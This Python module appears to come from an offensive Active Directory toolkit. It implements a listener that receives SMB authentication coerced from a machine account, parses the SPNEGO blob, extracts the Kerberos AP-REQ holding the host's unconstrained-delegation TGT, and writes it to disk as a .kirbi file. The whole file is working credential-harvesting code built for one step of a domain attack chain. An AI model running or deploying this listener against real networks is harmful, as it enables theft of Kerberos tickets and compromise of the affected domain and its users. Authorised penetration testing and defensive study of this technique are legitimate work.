"""Minimal in-process Kerberos AP-REQ / TGT capture listener.

Listens for SMB connections (the kind produced when a coercion trigger
forces a machine account to authenticate to us), peels the NetBIOS
session header and the SMB2 negotiate/session-setup frames far enough to
find the SPNEGO GSS-API blob, then extracts the Kerberos AP-REQ
(mechanism OID 1.2.840.113554.1.2.2) containing the coerced host's
unconstrained-delegation TGT.

Captured tickets are written as raw DER ``*.kirbi`` files under
``<session>/captured/``.

Honest limitation: the AP-REQ ticket is encrypted with the *machine*
account key of the authenticating computer. Using it for S4U2Self/
S4U2Proxy therefore still requires extracting that computer-account key
offline (krbrelayx-style, e.g. via the machine's RC4/AES key); this
listener only performs collection, not decryption.
"""

from __future__ import annotations

import re
import socket
import time
from pathlib import Path
from typing import Any

#: DER header of the Kerberos V5 GSS-API mechanism OID 1.2.840.113554.1.2.2.
KERBEROS_OID = b"\x06\x09\x2a\x86\x48\x86\xf7\x12\x01\x02\x02"

#: AP-REQ is Kerberos APPLICATION 0 -> tag byte 0x6E.
_AP_REQ_TAG = 0x6E

_DEFAULT_PORT = 4450


def _read_exact(sock: socket.socket, count: int) -> bytes | None:
    """Read exactly ``count`` bytes; return None on EOF or timeout."""
    chunks: list[bytes] = []
    remaining = count
    while remaining > 0:
        try:
            chunk = sock.recv(remaining)
        except (OSError, TimeoutError):
            return None
        if not chunk:
            return None
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def _read_der_length(data: bytes, pos: int) -> tuple[int, int] | None:
    """Parse a DER length at ``pos``; return (length, next_offset) or None."""
    if pos >= len(data):
        return None
    first = data[pos]
    if first < 0x80:
        return first, pos + 1
    count = first & 0x7F
    end = pos + 1 + count
    if count == 0 or end > len(data):
        return None
    return int.from_bytes(data[pos + 1 : end], "big"), end


def _extract_apreq(data: bytes) -> bytes | None:
    """Extract the raw DER AP-REQ token from an SPNEGO/SMB blob, if present."""
    idx = data.find(KERBEROS_OID)
    if idx < 0:
        return None
    pos = idx + len(KERBEROS_OID)
    if pos >= len(data) or data[pos] != _AP_REQ_TAG:
        return None
    parsed = _read_der_length(data, pos + 1)
    if parsed is None:
        return None
    length, body_start = parsed
    body_end = body_start + length
    if body_end > len(data):
        return None
    return data[pos:body_end]


class TgtCaptureListener:
    """TCP listener that harvests AP-REQ TGTs from incoming SMB auth blobs."""

    def __init__(
        self,
        output_dir: Path,
        *,
        host: str = "0.0.0.0",  # nosec B104 - default listener must accept coerced auth from any interface; caller-overridable
        port: int = _DEFAULT_PORT,
        timeout: float = 15.0,
        max_captures: int = 1,
    ) -> None:
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_captures = max(1, max_captures)
        self.captured_dir = output_dir / "captured"
        self.captures: list[dict[str, Any]] = []
        self.error: str | None = None
        self._server: socket.socket | None = None

    @property
    def endpoint(self) -> str:
        """Address coercion triggers should be pointed at."""
        return "127.0.0.1" if self.host in ("", "0.0.0.0", "::") else self.host  # nosec B104 - value is an INPUT sentinel; endpoint accessor narrows it to 127.0.0.1

    def start(self) -> bool:
        """Bind and listen; return False (recording ``error``) on bind failure."""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            exclusive_reuse = getattr(socket, "SO_EXCLUSIVEADDRUSE", None)
            if exclusive_reuse is not None:
                server.setsockopt(socket.SOL_SOCKET, exclusive_reuse, 1)
            else:
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.host, self.port))
            server.listen(5)
            server.settimeout(0.25)
        except OSError as exc:
            self.error = f"capture listener bind failed: {exc}"
            return False
        self._server = server
        self.captured_dir.mkdir(parents=True, exist_ok=True)
        return True

    def wait(self) -> list[dict[str, Any]]:
        """Accept connections until the deadline or the capture quota is met."""
        deadline = time.monotonic() + self.timeout
        while len(self.captures) < self.max_captures:
            remaining = deadline - time.monotonic()
            if remaining <= 0 or self._server is None:
                break
            try:
                self._server.settimeout(min(remaining, 0.5))
                conn, addr = self._server.accept()
            except TimeoutError:
                continue
            except OSError as exc:
                self.error = str(exc)
                break
            try:
                self._handle_connection(conn, addr)
            except OSError as exc:
                self.error = str(exc)
            finally:
                conn.close()
        return self.captures

    def stop(self) -> None:
        """Close the listening socket."""
        if self._server is not None:
            self._server.close()
            self._server = None

    def summary(self) -> dict[str, Any]:
        """Operator-facing capture document for workflow results."""
        doc: dict[str, Any] = {
            "performed": True,
            "endpoint": f"{self.endpoint}:{self.port}",
            "count": len(self.captures),
            "files": [entry["file"] for entry in self.captures],
        }
        if self.error:
            doc["error"] = self.error
        return doc

    def _handle_connection(self, conn: socket.socket, addr: tuple[str, int]) -> None:
        conn.settimeout(2.0)
        header = _read_exact(conn, 4)
        if header is None or header[0] != 0:
            return
        payload_len = int.from_bytes(header[1:4], "big")
        if payload_len == 0:
            return
        payload = _read_exact(conn, payload_len)
        if payload is None:
            return
        apreq = _extract_apreq(payload)
        if apreq is None:
            return
        self._write_capture(apreq, addr[0])

    def _write_capture(self, apreq: bytes, peer: str) -> None:
        self.captured_dir.mkdir(parents=True, exist_ok=True)
        safe_host = re.sub(r"[^A-Za-z0-9._-]", "_", peer) or "unknown"
        index = len(self.captures) + 1
        path = self.captured_dir / f"{safe_host}-{index}.kirbi"
        path.write_bytes(apreq)
        self.captures.append(
            {
                "file": str(path),
                "host": peer,
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "size": len(apreq),
            }
        )


__all__ = ["KERBEROS_OID", "TgtCaptureListener", "_extract_apreq"]
